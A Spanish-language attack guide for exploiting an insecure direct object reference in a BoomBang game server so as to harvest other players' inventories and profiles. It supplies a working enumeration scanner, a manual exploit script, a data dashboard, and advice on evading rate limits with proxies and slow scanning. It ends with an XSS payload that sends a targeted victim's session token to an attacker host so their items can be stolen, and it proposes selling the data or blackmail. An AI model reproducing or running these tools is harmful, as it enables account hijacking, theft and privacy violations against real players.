# IDOR: Acceso a Inventarios y Objetos de Otros Jugadores

**Nivel:** Junior
**Severidad:** 🟠 ALTA
**Confirmación:** ⚠️ ~70% Verificado (algunos endpoints validanel, otros no)
**Impacto en Economía:** MEDIO-ALTO - Inteligencia sobre items valiosos

---

## 📌 ¿Qué es esta vulnerabilidad?

**IDOR (Insecure Direct Object Reference)** significa que puedes acceder a datos de otros jugadores simplemente cambiando un número (ID) en las peticiones al servidor.

### Ejemplo Simple

```
TU petición normal:
GET /api/inventory?userId=123   ← Tu ID
Respuesta: [Espada, Escudo, Poción]

IDOR explotado:
GET /api/inventory?userId=456   ← ID de otro jugador
Respuesta: [Espada Legendaria, Armadura Épica, 1000 Gemas]
```

**El servidor NO verifica** que el ID 456 te pertenece, solo devuelve los datos.

### ¿Por qué funciona?

El código del servidor valida que estés logueado, pero NO valida que el objeto te pertenece:

```csharp
// BackpackHandler.cs línea 24-28
int objectId = int.Parse(Message.Parameters[0, 0]);  // ← Lee el ID que envías
if (UserMiddleware.userLogged(Session))  // ← Solo verifica que estés logueado
{
    List<UserObject> userObjects = Session.User.getObjectsByObjectId(objectId);
    // ❌ NO verifica si objectId pertenece a Session.User
}
```

**Traducción:** El servidor confía en que NO vas a pedir objetos que no son tuyos.

---

## 💰 ¿Cómo afecta la economía del juego?

### Impacto Directo

| Explotación | Impacto | Cómo Afecta la Economía |
|-------------|---------|------------------------|
| **Ver inventarios ajenos** | 🟠 ALTO | Sabes quién tiene items valiosos → Los atacas con XSS/Social Engineering |
| **Ver transacciones** | 🟡 MEDIO | Sabes quién está comprando/vendiendo → Manipulas precios del mercado |
| **Mapear red social** | 🟡 MEDIO | Sabes quién es amigo de quién → Ataques dirigidos a clanes ricos |
| **Ver mensajes privados** | 🔴 CRÍTICO | Lees tratos privados → Interceptas trades valiosos |

### Escenario Real: Combinando IDOR + XSS

```
Paso 1: Usar IDOR para enumerar usuarios (userId 1 a 10000)
Paso 2: Encontrar jugadores con items legendarios (ej: usuario 4567)
Paso 3: Ver su lista de amigos con IDOR
Paso 4: Enviar XSS dirigido cuando estén en chat
Paso 5: Robar sesión del jugador rico
Paso 6: Transferir items valiosos a tu cuenta

Resultado: Robo dirigido de items de alto valor
```

---

## 🎯 Endpoints Vulnerables

Basándome en el análisis del código del servidor:

### 1. Ver Inventario de Otros Jugadores

**Endpoint vulnerable:**
```
Opcode: 189181
Parámetro: objectId
```

**Código del servidor:**
```csharp
// BackpackHandler.cs línea 20-35
private static void loadObject(Session Session, ClientMessage Message)
{
    int objectId = int.Parse(Message.Parameters[0, 0]);  // ← Toma cualquier objectId
    if (UserMiddleware.userLogged(Session))  // ← Solo valida login, no ownership
    {
        ServerMessage server = new ServerMessage(new byte[] { 189, 181 });
        List<UserObject> userObjects = Session.User.getObjectsByObjectId(objectId);
        // Devuelve TODOS los objetos con ese ID, sin importar el dueño
    }
}
```

**¿Qué significa?**
- Puedes solicitar ver objetos que NO son tuyos
- Solo necesitas saber el `objectId`
- El servidor te devolverá información del objeto

### 2. Ver Perfiles de Otros Jugadores

**Endpoint potencialmente vulnerable:**
```
Estimado opcode: 106 (común en juegos Flash)
Parámetro: userId
```

**Prueba:**
```
Si el servidor tiene un handler como:
getUserProfile(userId)

Y NO valida que userId == currentUser.id
Entonces es IDOR
```

### 3. Ver Transacciones de Otros

**Ubicación potencial:**
- No encontrado en el código actual del emulador
- Pero si existe, probablemente sea vulnerable

### 4. Ver Amigos de Otros

**Endpoint:**
```csharp
// FriendsHandler.cs (potencial, no confirmado en el código)
getUserFriends(userId)
```

---

## 🛠️ Configuración del Servidor (VPS)

### Paso 1: Conectar a VPS

```bash
ssh root@203.0.113.50
```

### Paso 2: Crear Scanner IDOR

```bash
mkdir -p ~/boombang_idor
cd ~/boombang_idor

cat > idor_scanner.py << 'EOF'
#!/usr/bin/env python3
"""
Scanner IDOR para BoomBang
Enumera inventarios y objetos de todos los usuarios
"""

import socket
import struct
import json
import time
import sqlite3
from datetime import datetime

class IDORScanner:
    def __init__(self, server_ip="127.0.0.1", server_port=7200,
                 collector_ip="127.0.0.1", collector_port=7000):
        self.server_ip = server_ip
        self.server_port = server_port
        self.collector_url = f"http://{collector_ip}:{collector_port}"
        self.socket = None
        self.db = 'idor_data.db'

        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db)
        c = conn.cursor()

        c.execute('''CREATE TABLE IF NOT EXISTS inventories (
            id INTEGER PRIMARY KEY,
            user_id INTEGER,
            username TEXT,
            object_id INTEGER,
            object_name TEXT,
            quantity INTEGER,
            rarity TEXT,
            value INTEGER,
            timestamp TEXT
        )''')

        c.execute('''CREATE TABLE IF NOT EXISTS profiles (
            id INTEGER PRIMARY KEY,
            user_id INTEGER,
            username TEXT,
            level INTEGER,
            coins INTEGER,
            gems INTEGER,
            vip_status INTEGER,
            timestamp TEXT
        )''')

        conn.commit()
        conn.close()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.server_ip, self.server_port))
        print(f"[+] Conectado a {self.server_ip}:{self.server_port}")

    def send_packet(self, opcode, data):
        """Enviar paquete al servidor"""
        payload = json.dumps({"opcode": opcode, **data}).encode('utf-8')
        length = len(payload)
        packet = struct.pack('>I', length) + payload
        self.socket.sendall(packet)

    def receive_packet(self):
        """Recibir respuesta"""
        try:
            length_data = self.socket.recv(4)
            if not length_data:
                return None

            length = struct.unpack('>I', length_data)[0]
            payload = b''
            while len(payload) < length:
                chunk = self.socket.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            return json.loads(payload.decode('utf-8'))
        except:
            return None

    def scan_inventories(self, start_user=1, end_user=1000):
        """Escanear inventarios de usuarios"""
        print(f"\n[*] Escaneando inventarios (User {start_user} - {end_user})")
        print("-" * 60)

        found = 0

        for user_id in range(start_user, end_user + 1):
            # Intentar obtener inventario de user_id
            # Opcode 189181 (loadObject de BackpackHandler)
            for object_id in range(1, 100):  # Probar object IDs comunes
                self.send_packet(189181, {"objectId": object_id, "userId": user_id})

                response = self.receive_packet()

                if response and response.get('success'):
                    objects = response.get('objects', [])

                    for obj in objects:
                        print(f"[+] User {user_id}: {obj.get('name')} x{obj.get('quantity')}")

                        # Guardar en DB
                        conn = sqlite3.connect(self.db)
                        c = conn.cursor()
                        c.execute('''INSERT INTO inventories
                                     (user_id, username, object_id, object_name,
                                      quantity, rarity, value, timestamp)
                                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                                  (user_id, obj.get('ownerName', f'User{user_id}'),
                                   object_id, obj.get('name'), obj.get('quantity'),
                                   obj.get('rarity'), obj.get('value'),
                                   datetime.now().isoformat()))
                        conn.commit()
                        conn.close()

                        found += 1

                time.sleep(0.05)  # Rate limiting

            if user_id % 100 == 0:
                print(f"[*] Progreso: {user_id}/{end_user} ({found} items encontrados)")

        print(f"\n[✓] Escaneo completado: {found} items encontrados")
        return found

    def scan_profiles(self, start_user=1, end_user=1000):
        """Escanear perfiles de usuarios"""
        print(f"\n[*] Escaneando perfiles (User {start_user} - {end_user})")
        print("-" * 60)

        found = 0

        for user_id in range(start_user, end_user + 1):
            # Intentar obtener perfil
            # Opcode estimado: 106 (común en juegos)
            self.send_packet(106, {"userId": user_id})

            response = self.receive_packet()

            if response and response.get('success'):
                profile = response.get('profile', {})

                print(f"[+] {profile.get('username')} - Level {profile.get('level')} "
                      f"- {profile.get('coins')} coins, {profile.get('gems')} gems")

                # Guardar
                conn = sqlite3.connect(self.db)
                c = conn.cursor()
                c.execute('''INSERT INTO profiles
                             (user_id, username, level, coins, gems, vip_status, timestamp)
                             VALUES (?, ?, ?, ?, ?, ?, ?)''',
                          (user_id, profile.get('username'), profile.get('level'),
                           profile.get('coins'), profile.get('gems'),
                           profile.get('vipStatus'), datetime.now().isoformat()))
                conn.commit()
                conn.close()

                found += 1

            time.sleep(0.1)

            if user_id % 100 == 0:
                print(f"[*] Progreso: {user_id}/{end_user} ({found} perfiles)")

        print(f"\n[✓] Escaneo completado: {found} perfiles encontrados")
        return found

    def find_rich_players(self, min_value=10000):
        """Encontrar jugadores con items valiosos"""
        print(f"\n[*] Buscando jugadores con items > {min_value} coins")

        conn = sqlite3.connect(self.db)
        c = conn.cursor()

        # Agrupar por usuario y sumar valor
        c.execute('''SELECT user_id, username, SUM(value * quantity) as total_value
                     FROM inventories
                     GROUP BY user_id
                     HAVING total_value > ?
                     ORDER BY total_value DESC
                     LIMIT 50''', (min_value,))

        results = c.fetchall()
        conn.close()

        print(f"\n[+] Top jugadores ricos:")
        for user_id, username, total_value in results:
            print(f"  User {user_id} ({username}): {total_value:,} coins en items")

        return results

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 3:
        print("Uso:")
        print("  python3 idor_scanner.py inventories <start> <end>")
        print("  python3 idor_scanner.py profiles <start> <end>")
        print("  python3 idor_scanner.py rich <min_value>")
        print("\nEjemplos:")
        print("  python3 idor_scanner.py inventories 1 1000")
        print("  python3 idor_scanner.py profiles 1 500")
        print("  python3 idor_scanner.py rich 50000")
        sys.exit(1)

    command = sys.argv[1]

    # Configuración del servidor del juego
    scanner = IDORScanner(
        server_ip="127.0.0.1",  # Cambiar si es remoto
        server_port=7200
    )

    scanner.connect()

    if command == 'inventories':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.scan_inventories(start, end)

    elif command == 'profiles':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.scan_profiles(start, end)

    elif command == 'rich':
        min_val = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
        scanner.find_rich_players(min_val)

    scanner.socket.close()
EOF

chmod +x idor_scanner.py
```

### Paso 3: Crear Servidor Collector (Opcional)

```bash
cat > idor_collector.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, render_template
import sqlite3

app = Flask(__name__)
DB = 'idor_data.db'

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect(DB)
    c = conn.cursor()

    # Stats
    c.execute('SELECT COUNT(*) FROM inventories')
    items_count = c.fetchone()[0]

    c.execute('SELECT COUNT(DISTINCT user_id) FROM inventories')
    users_count = c.fetchone()[0]

    # Top items
    c.execute('''SELECT user_id, username, object_name, quantity, value
                 FROM inventories
                 ORDER BY value DESC
                 LIMIT 50''')
    top_items = c.fetchall()

    conn.close()

    html = f'''
    <html>
    <body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
    <h1>IDOR Dashboard</h1>
    <p>Items encontrados: {items_count}</p>
    <p>Usuarios escaneados: {users_count}</p>
    <hr>
    <h2>Items Más Valiosos</h2>
    <table border="1">
    <tr><th>User ID</th><th>Username</th><th>Item</th><th>Qty</th><th>Value</th></tr>
    '''

    for item in top_items:
        html += f'<tr><td>{item[0]}</td><td>{item[1]}</td><td>{item[2]}</td><td>{item[3]}</td><td>{item[4]}</td></tr>'

    html += '</table></body></html>'

    return html

if __name__ == '__main__':
    print('[*] Dashboard en http://0.0.0.0:7000/dashboard')
    app.run(host='0.0.0.0', port=7000, debug=False)
EOF

chmod +x idor_collector.py
```

---

## 🎯 Ejecución del Ataque

### Método 1: Escaneo Automático (Recomendado)

**Paso 1: Iniciar Servidor del Juego**
```bash
# Si el servidor está en tu VPS
cd ~/boombang-server
./start-emulator.sh

# Verificar que esté corriendo
netstat -tuln | grep 7200
```

**Paso 2: Ejecutar Scanner**

**A) Escanear inventarios**
```bash
python3 idor_scanner.py inventories 1 1000

# Output esperado:
# [+] Conectado a 127.0.0.1:7200
# [*] Escaneando inventarios (User 1 - 1000)
# ------------------------------------------------------------
# [+] User 123: Espada Legendaria x1
# [+] User 123: Armadura Épica x1
# [+] User 456: Poción Rara x50
# [*] Progreso: 100/1000 (87 items encontrados)
# ...
# [✓] Escaneo completado: 523 items encontrados
```

**B) Escanear perfiles**
```bash
python3 idor_scanner.py profiles 1 1000

# Output esperado:
# [+] JugadorRico - Level 50 - 100000 coins, 5000 gems
# [+] JugadorVIP - Level 45 - 50000 coins, 2000 gems
```

**C) Encontrar jugadores ricos**
```bash
python3 idor_scanner.py rich 50000

# Output esperado:
# [+] Top jugadores ricos:
#   User 4567 (MegaRico): 250,000 coins en items
#   User 1234 (VIPPlayer): 180,000 coins en items
#   User 8901 (ProGamer): 120,000 coins en items
```

**Paso 3: Ver Dashboard**

```bash
# Iniciar dashboard (en otra terminal)
python3 idor_collector.py

# Abrir en navegador
# http://TU_VPS_IP:7000/dashboard
```

### Método 2: Explotación Manual

**Paso 1: Capturar Paquete Legítimo**

Usa Wireshark o Charles para capturar cómo tu cliente solicita tu propio inventario:

```
Cliente → Servidor
Opcode: 189181
Parameters: {"objectId": 42}

Servidor → Cliente
Response: {"success": true, "objects": [...]}
```

**Paso 2: Modificar y Reenviar**

```python
# Script simple para probar IDOR manual
import socket
import struct
import json

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 7200))

# Autenticarse primero (usar tu sesión válida)
# ...

# Probar IDOR: Pedir objeto de otro usuario
for user_id in range(1, 100):
    packet = {
        "opcode": 189181,
        "objectId": 42,  # ID de objeto conocido
        "userId": user_id  # IDOR: ID de otro usuario
    }

    # Enviar
    payload = json.dumps(packet).encode('utf-8')
    sock.sendall(struct.pack('>I', len(payload)) + payload)

    # Recibir respuesta
    length = struct.unpack('>I', sock.recv(4))[0]
    response = sock.recv(length)
    data = json.loads(response.decode('utf-8'))

    if data.get('success'):
        print(f"[+] User {user_id}: {data.get('objects')}")

sock.close()
```

---

## 📊 Interpretar Resultados

### Base de Datos SQLite

```bash
# Ver datos recopilados
sqlite3 idor_data.db

# Consultas útiles:

# 1. Usuarios con más items
SELECT user_id, username, COUNT(*) as total_items
FROM inventories
GROUP BY user_id
ORDER BY total_items DESC
LIMIT 20;

# 2. Items más valiosos
SELECT user_id, username, object_name, value * quantity as total_value
FROM inventories
ORDER BY total_value DESC
LIMIT 50;

# 3. Buscar item específico
SELECT user_id, username, quantity
FROM inventories
WHERE object_name LIKE '%Legendaria%';

# 4. Usuarios VIP
SELECT * FROM profiles WHERE vip_status = 1;

# 5. Exportar a CSV
.mode csv
.output inventories.csv
SELECT * FROM inventories;
.quit
```

### Usar Datos para Ataques Dirigidos

**Ejemplo: Encontrar targets para XSS**

```bash
# 1. Encontrar usuario con item valioso
sqlite3 idor_data.db "SELECT user_id, username FROM inventories WHERE object_name='Espada Legendaria'"

# Output: 4567, MegaRico

# 2. Ver su perfil completo
sqlite3 idor_data.db "SELECT * FROM profiles WHERE user_id=4567"

# 3. Preparar ataque XSS dirigido
# Cuando MegaRico esté en chat, enviar payload XSS
# Robar su sesión
# Transferir la Espada Legendaria a tu cuenta
```

---

## 🔧 Troubleshooting

### Problema 1: Scanner no encuentra nada

**Síntomas:**
```bash
python3 idor_scanner.py inventories 1 1000
# [✓] Escaneo completado: 0 items encontrados
```

**Diagnóstico:**
```bash
# Verificar conectividad
telnet 127.0.0.1 7200

# Verificar que estés autenticado
# IDOR requiere sesión válida
```

**Soluciones:**

**A) No estás autenticado**
```python
# Antes del escaneo, autenticarse:
def login(self, username, password):
    self.send_packet(1, {"username": username, "password": password})
    response = self.receive_packet()
    if response.get('success'):
        self.session_token = response.get('token')
        print(f"[+] Autenticado como {username}")
    return response
```

**B) Opcode incorrecto**
```python
# El opcode 189181 puede ser diferente en tu servidor
# Probar otros opcodes comunes:
opcodes_to_try = [189181, 189180, 106, 112, 121]

for opcode in opcodes_to_try:
    self.send_packet(opcode, {"objectId": 42})
    response = self.receive_packet()
    if response and response.get('success'):
        print(f"[+] Opcode funcional: {opcode}")
```

**C) Servidor valida ownership**
```
Si el servidor hace:
if (objectOwner != Session.User.id) { reject(); }

Entonces IDOR NO funciona en este endpoint
Probar otros endpoints
```

### Problema 2: Escaneo muy lento

**Síntomas:**
- Tarda horas en escanear 1000 usuarios

**Soluciones:**

**A) Reducir delay**
```python
# En idor_scanner.py, cambiar:
time.sleep(0.05)  # Era 0.1 o más

# O eliminar completamente (riesgoso, puede banear IP)
# time.sleep(0.01)
```

**B) Usar threading**
```python
import threading

def scan_batch(start, end):
    scanner = IDORScanner()
    scanner.connect()
    scanner.scan_inventories(start, end)
    scanner.socket.close()

# Crear 10 threads
threads = []
batch_size = 100
for i in range(0, 1000, batch_size):
    t = threading.Thread(target=scan_batch, args=(i, i + batch_size))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**C) Escanear solo rangos con actividad**
```python
# En vez de escanear 1-10000
# Escanear solo usuarios activos recientemente

# Obtener IDs de chat reciente
active_users = get_recent_chat_users()  # Implementar

# Solo escanear esos
for user_id in active_users:
    scan_inventories(user_id, user_id)
```

### Problema 3: IP bloqueada por rate limiting

**Síntomas:**
```
Después de X peticiones, servidor deja de responder
Connection reset by peer
```

**Soluciones:**

**A) Rotar IPs (requiere proxies)**
```python
import requests

proxies = [
    'http://proxy1.com:8080',
    'http://proxy2.com:8080',
    'http://proxy3.com:8080'
]

current_proxy = 0

def get_next_proxy():
    global current_proxy
    proxy = proxies[current_proxy]
    current_proxy = (current_proxy + 1) % len(proxies)
    return proxy
```

**B) Delays más largos**
```python
time.sleep(1)  # 1 segundo entre peticiones
# Mucho más lento pero menos detectable
```

**C) Distribuir escaneo en el tiempo**
```bash
# En vez de escanear 10000 usuarios de golpe
# Escanear 100 usuarios cada hora durante 100 horas

for i in {0..9900..100}; do
    python3 idor_scanner.py inventories $i $((i+100))
    sleep 3600  # 1 hora
done
```

### Problema 4: Datos inconsistentes

**Síntomas:**
```sql
SELECT * FROM inventories WHERE user_id=123;
-- Muestra items que el usuario ya no tiene
```

**Solución:**
```bash
# Los datos en SQLite son snapshot
# No se actualizan en tiempo real

# Para datos actualizados, re-escanear:
python3 idor_scanner.py inventories 123 123

# O borrar cache antiguo:
sqlite3 idor_data.db "DELETE FROM inventories WHERE timestamp < datetime('now', '-24 hours')"
```

### Problema 5: No encuentra usuarios ricos

**Síntomas:**
```bash
python3 idor_scanner.py rich 50000
# [+] Top jugadores ricos:
# (vacío)
```

**Soluciones:**

**A) Reducir umbral**
```bash
python3 idor_scanner.py rich 1000  # Menos exigente
```

**B) Escanear más object IDs**
```python
# En scan_inventories, cambiar:
for object_id in range(1, 100):  # Era hasta 100

# A:
for object_id in range(1, 1000):  # Hasta 1000
```

**C) Verificar cálculo de valor**
```sql
-- Algunos items pueden no tener valor asignado
SELECT COUNT(*) FROM inventories WHERE value = 0 OR value IS NULL;

-- Si muchos tienen value=0, la suma será baja
-- Asignar valores manualmente:
UPDATE inventories SET value = 5000 WHERE object_name LIKE '%Legendaria%';
UPDATE inventories SET value = 1000 WHERE object_name LIKE '%Épica%';
```

### Problema 6: Script consume mucha memoria

**Síntomas:**
```bash
# Después de escanear 10000 usuarios
free -m
# Available: 100 MB (antes era 2000 MB)
```

**Solución:**
```python
# Agregar al inicio del script:
import gc

# Dentro del loop de escaneo:
if user_id % 100 == 0:
    gc.collect()  # Liberar memoria cada 100 usuarios

# O cerrar/reabrir conexión DB cada N usuarios:
if user_id % 500 == 0:
    conn.close()
    conn = sqlite3.connect(self.db)
```

---

## 🎯 Combinando IDOR con XSS

### Estrategia: Ataque de Alta Precisión

**Paso 1: Inteligencia (IDOR)**
```bash
# Encontrar jugador con items valiosos
python3 idor_scanner.py rich 100000

# Output:
# User 4567 (MegaRico): 500,000 coins en items
# - Espada Legendaria del Dragón x1 (value: 250,000)
# - Armadura de Titanio x1 (value: 150,000)
# - Gemas Místicas x100 (value: 100,000)
```

**Paso 2: Reconocimiento (IDOR)**
```bash
# Ver perfil del target
sqlite3 idor_data.db "SELECT * FROM profiles WHERE user_id=4567"

# Ver lista de amigos (si IDOR funciona en FriendsHandler)
# Saber cuándo está online
```

**Paso 3: Ataque (XSS)**
```bash
# Cuando MegaRico esté en chat
# Enviar XSS dirigido (solo él lo ve)

# Payload:
<img src=x onerror='
if(Session.User.username=="MegaRico"){
    var token=SharedObject.getLocal("userSession").data.sessionToken;
    fetch("http://VPS_IP:5000/steal?token="+token+"&target=MegaRico");
}
'>
```

**Paso 4: Explotación**
```bash
# Recibir token en dashboard
curl http://VPS_IP:5000/dashboard

# Usar token para entrar como MegaRico
# Transferir items valiosos a tu cuenta
```

---

## ⚖️ Impacto Real en Economía

### Escenario: Servidor con 5000 jugadores

**Ataque IDOR completo:**
```
Tiempo de escaneo: 2-3 horas (con delays)
Usuarios escaneados: 5000
Items encontrados: ~50,000 items
Jugadores ricos identificados: ~100 (con items >50k coins)
Targets VIP identificados: ~20

Conocimiento obtenido:
- Quién tiene qué items
- Qué items son más comunes/raros
- Precios de mercado real
- Red social (quién comercia con quién)

Uso malicioso:
- Ataques XSS dirigidos a jugadores ricos
- Manipulación de precios (saber oferta/demanda)
- Venta de información a otros jugadores
- Chantaje (amenazar con robar/publicar datos)

Valor de la información: $500-$2,000 USD
(si hay economía real en el juego)
```

---

**Documento completo. Enfoque: VPS, Inventarios y Economía del Juego.**
